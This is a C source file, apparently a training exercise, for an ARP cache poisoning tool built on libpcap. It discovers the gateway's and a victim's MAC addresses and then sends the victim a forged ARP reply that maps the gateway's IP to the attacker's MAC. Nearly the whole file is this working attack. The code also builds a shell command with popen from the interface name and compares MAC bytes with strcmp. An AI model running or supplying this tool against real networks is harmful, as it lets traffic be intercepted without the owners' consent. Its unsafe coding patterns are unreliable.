#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <arpa/inet.h>
#include <pcap.h>

#define ETH_ARP_H     42    // pcap_sendpacket() : minimum 64 bytes, 14(eth) + 20(IP) + 20(TCP) 6(padding) + 4(CRC)
#define ETH_ARP_PAD_H 60    // init arp pakcet

#define IP_ADDR_LEN      4  // ip length
#define ETHER_ADDR_LEN   6  // mac length
#define IP_ADDR_STR_SIZE INET_ADDRSTRLEN // maximum length of destination string

#define ETHERTYPE_IP  0x0800
#define ETHERTYPE_ARP 0x0806    // htons()

#define ARPHRD_ETHER 1
#define ARPPRO_IP    0x0800

/* arp operation */
#define ARPOP_RESERVE    0
#define ARPOP_REQUEST    1
#define ARPOP_REPLY      2

#define CMD_BUF_SIZE 128    // get_gateway_ip($route -n command)

struct eth_hdr {
    uint8_t  eth_dhost[ETHER_ADDR_LEN]; // destination ethernet address
    uint8_t  eth_shost[ETHER_ADDR_LEN]; // source ethernet address
    uint16_t eth_type;                  // protocol
};

struct arp_hdr {
    uint16_t ar_hrd; // type of hardware /* Ethernet = 0x0001 */
    uint16_t ar_pro; // type of protocol /* IPv4 = 0x0800 */

    uint8_t  ar_hln; // MAC length 6
    uint8_t  ar_pln; // IP length 4
    uint16_t ar_op;  // operation type ex) Request, Reply

    uint8_t  ar_eth_shost[ETHER_ADDR_LEN];  // Setting src MAC
    uint8_t  ar_ip_src_addr[IP_ADDR_LEN];   // Setting src IP
    uint8_t  ar_eth_dhost[ETHER_ADDR_LEN];  // Setting dst MAC
    uint8_t  ar_ip_dst_addr[IP_ADDR_LEN];   // Setting dst IP
};

struct eth_arp_hdr {
    struct eth_hdr eth_h;
    struct arp_hdr arp_h;
};

struct data_ip_host {
    struct in_addr my_ip;       // my_ip
    struct in_addr gateway_ip;  // gateway_ip
    struct in_addr victim_ip;   // victim_ip
    uint8_t my_host[ETHER_ADDR_LEN];         // my_MAC
    uint8_t gateway_host[ETHER_ADDR_LEN];    // gateway_MAC
    uint8_t victim_host[ETHER_ADDR_LEN];     // victim_MAC
};


/* Declaration of Functions */
// const char *inet_ntop(int af/*AF_INET == IPv4*/, const void *src, char *dst, socklen_t size) // ip address -> system calls
// int pcap_sendpacket(pcap_t *p, const u_char *buf, int size)  // send_packet()

// Set arp_packet before send packet
void set_arp_packet(struct eth_arp_hdr *pkt, const struct in_addr *src_ip, const struct in_addr *dst_ip, const uint8_t *dst_host, const uint16_t opcode) {
    pkt->arp_h.ar_op = htons(opcode);
    memcpy(pkt->arp_h.ar_ip_dst_addr, &src_ip->s_addr, IP_ADDR_LEN);
    memcpy(pkt->arp_h.ar_ip_src_addr, &dst_ip->s_addr, IP_ADDR_LEN);
    // Broadcast
    if (dst_host == NULL) {
        memset(pkt->eth_h.eth_dhost, -1, ETHER_ADDR_LEN);
        memset(pkt->arp_h.ar_eth_dhost, 0, ETHER_ADDR_LEN);
    }
    // Destination
    else {
        memcpy(pkt->eth_h.eth_dhost, dst_host, ETHER_ADDR_LEN);
        memcpy(pkt->arp_h.ar_eth_dhost, dst_host, ETHER_ADDR_LEN);
    }
}


// Receive arp_packet
void recv_arp_packet(pcap_t *fp, uint8_t *host, const uint8_t *dst_host, const uint16_t opcode) {
    int res;
    struct pcap_pkthdr *header;
    const uint8_t *packet;
    struct eth_arp_hdr *pkt;

    while ((res = pcap_next_ex(fp, &header, &packet)) >= 0) {
        // Timeout elapsed
        if (res == 0) continue;
        // Check arp
        pkt = (struct eth_arp_hdr *)packet;
        if (pkt->eth_h.eth_type != htons(ETHERTYPE_ARP)) continue;
        if (pkt->arp_h.ar_op != htons(opcode)) continue;
        if (dst_host != NULL) if (strcmp(dst_host, pkt->eth_h.eth_dhost)) continue;
        break;
    }
    if (res == -1) {
        perror(pcap_geterr(fp));
        exit(1);
    }
    if (host != NULL)
        memcpy(host, pkt->eth_h.eth_shost, ETHER_ADDR_LEN);
}


// Print IP, MAC
void addr_print(const uint8_t *addr, const uint32_t addr_len) {
    uint8_t ip_addr_str[IP_ADDR_STR_SIZE];
    switch (addr_len) {
    case IP_ADDR_LEN:
        inet_ntop(AF_INET, addr, ip_addr_str, IP_ADDR_STR_SIZE);
        printf("%s\n", ip_addr_str);
        break;
    case ETHER_ADDR_LEN:
        printf("%02x:%02x:%02x:%02x:%02x:%02x\n", addr[0], addr[1], addr[2], addr[3], addr[4], addr[5]);
        break;
    default:
        break;
    }
}

int main(int argc, char *argv[]) {
    pcap_if_t *alldevs, *d;
    uint32_t inum, i = 0;
    uint8_t errbuf[PCAP_ERRBUF_SIZE];

    // Retrieve the device list on the local machine
    if (pcap_findalldevs(&alldevs, errbuf) == -1) {
        perror(errbuf);
        exit(1);
    }

    // Print the list
    printf("\n=====================================================\n");

    for (d = alldevs; d; d = d->next) {
        printf("%d. %s", ++i, d->name);
        if (d->description)
            printf(" (%s)\n", d->description);
        else
            printf(" (No description available)\n");
    }
    if (i == 0) {
        perror("\nNo interfaces found!\n");
        exit(1);
    }

    printf("\nEnter the interface number (1-%d): ", i);
    scanf("%d", &inum);
    if (inum < 1 || inum > i) {
        perror("\nInterface number out of range\n");
        // Free the device list
        pcap_freealldevs(alldevs);
        exit(1);
    }

    // Jump to the selected adapter
    for (d = alldevs, i = 0; i< inum - 1; d = d->next, i++);

    // Open the output device
    pcap_t *fp;
    fp = pcap_open_live(d->name,    // name of the device
        65536,  // portion of the pacekt to capture
        0,  // promiscuous mode
        1000,   // read timeout
        errbuf);  // err buffer);
    if (fp == NULL) {
        perror(errbuf);
        exit(1);
    }
    printf("\n");


    // Declare interface, data
    uint8_t interface[IFNAMSIZ] = { 0 };
    memcpy(interface, d->name, strlen(d->name));
    pcap_freealldevs(alldevs);
    struct data_ip_host data;


    /* 1. Get my IP and MAC */
    // 1-0. Get my_host
    void get_my_ip_host(const uint8_t *interface, struct in_addr *my_ip, uint8_t *my_host) {
        struct ifreq ifr;
        int32_t fd;

        fd = socket(AF_INET, SOCK_DGRAM, IPPROTO_IP);
        if (fd < 0) {
            perror("\nsocket() error\n");
            exit(1);
        }

        memcpy(ifr.ifr_name, interface, IFNAMSIZ);
        if (ioctl(fd, SIOCGIFADDR, &ifr) == -1) {
            perror("\nioctl() error. finding my ip fail.\n");
            exit(1);
        }

        memcpy(&my_ip->s_addr, ifr.ifr_addr.sa_data + (ETHER_ADDR_LEN - IP_ADDR_LEN), IP_ADDR_LEN);

        if (ioctl(fd, SIOCGIFHWADDR, &ifr) == -1) {
            perror("\nFinding my MAC fail.\n");
            exit(1);
        }
        memcpy(my_host, ifr.ifr_hwaddr.sa_data, ETHER_ADDR_LEN);
    }


    // 1-1. Get my_ip
    printf("My IP:       ");
    get_my_ip_host(interface, &data.my_ip, data.my_host);
    addr_print((uint8_t *)&data.my_ip.s_addr, IP_ADDR_LEN);

    /* 1-2. Get my_mac */
    printf("My MAC:      ");
    addr_print(data.my_host, ETHER_ADDR_LEN);


    /* 2. Get gateway_ip */
    // 2-1. Get gateway ip
    // route -n 명령어에서 gateway ip를 얻습니다.
    void get_gateway_ip(const uint8_t *interface, struct in_addr *gateway_ip) {
        uint8_t cmd[CMD_BUF_SIZE] = { 0 };
        uint8_t line[IP_ADDR_STR_SIZE] = { 0 };

        sprintf(cmd, "route -n |grep %s |grep 'UG[ \t]' |awk '{print $2}'", interface);
        FILE* fp = popen(cmd, "r");

        if (fgets(line, IP_ADDR_STR_SIZE, fp) == NULL) {
            perror("\nFinding gateway IP fail.\n");
            exit(1);
        }
        line[strlen(line) - 1] = '\0';
        inet_pton(AF_INET, line, &gateway_ip->s_addr);
        pclose(fp);
    }
    get_gateway_ip(interface, &data.gateway_ip);
    inet_pton(AF_INET, argv[1], &data.victim_ip.s_addr);
    printf("Gateway IP:  ");
    addr_print((uint8_t *)&data.gateway_ip.s_addr, IP_ADDR_LEN);


    // 2-2. Get victim_ip
    printf("Victim IP:   ");
    addr_print((uint8_t *)&data.victim_ip.s_addr, IP_ADDR_LEN);


    /* 3-1. Request gateway and Get gateway_mac */
    // 3-1-0. Init arp packet
    uint8_t packet[ETH_ARP_PAD_H] = { 0 };
    struct eth_arp_hdr *pkt = (struct eth_arp_hdr *)packet;

    // arp 패킷을 초기화하는 함수입니다.
    void init_arp_packet(struct eth_arp_hdr *pkt, const struct data_ip_host *data) {
        // ethernet
        // memset(pkt->eth_h.eth_dhost, MEMSET_BROADCAST /* -1 */, ETHER_ADDR_LEN);
        memcpy(pkt->eth_h.eth_shost, data->my_host, ETHER_ADDR_LEN);
        pkt->eth_h.eth_type = htons(ETHERTYPE_ARP);
        // arp base
        pkt->arp_h.ar_hrd = htons(ARPHRD_ETHER);
        pkt->arp_h.ar_pro = htons(ARPPRO_IP);
        pkt->arp_h.ar_hln = ETHER_ADDR_LEN;
        pkt->arp_h.ar_pln = IP_ADDR_LEN;
        pkt->arp_h.ar_op = htons(ARPOP_RESERVE); // 0
                                                 // arp add
        memcpy(pkt->arp_h.ar_eth_shost, data->my_host, ETHER_ADDR_LEN);
        memcpy(pkt->arp_h.ar_ip_src_addr, &data->my_ip.s_addr, IP_ADDR_LEN);
        // memset(pkt->arp_h.ar_eth_dhost, MEMSET_NULL /* 0 */, ETHER_ADDR_LEN);
        memset(pkt->arp_h.ar_ip_dst_addr, 0, IP_ADDR_LEN);
    }
    init_arp_packet(pkt, &data);

    // 3-1-1. Request gateway
    set_arp_packet(pkt, &data.gateway_ip, &data.my_ip, NULL, ARPOP_REQUEST);
    pcap_sendpacket(fp, packet, ETH_ARP_H);

    // 3-1-2. Receive gateway_mac
    recv_arp_packet(fp, data.gateway_host, data.my_host, ARPOP_REPLY);
    printf("Gateway MAC: ");
    addr_print(data.gateway_host, ETHER_ADDR_LEN);


    /* 3-2-1. Request victim and Get victim_mac */
    // Request victim
    set_arp_packet(pkt, &data.victim_ip, &data.my_ip, NULL, ARPOP_REQUEST);
    pcap_sendpacket(fp, packet, ETH_ARP_H);

    // 3-2-2. Receive victim_mac
    recv_arp_packet(fp, data.victim_host, data.my_host, ARPOP_REPLY);
    printf("Victim MAC:  ");
    addr_print(data.victim_host, ETHER_ADDR_LEN);


    /* 4. Send poisoned arp packet */
    printf("\nsend_arp() : ARP Packet Sending........\n");
    set_arp_packet(pkt, &data.victim_ip, &data.gateway_ip, data.victim_host, ARPOP_REPLY);
    pcap_sendpacket(fp, packet, ETH_ARP_H);
    printf("Program finished");
    printf("\n=====================================================\n\n");

    return 0;
}
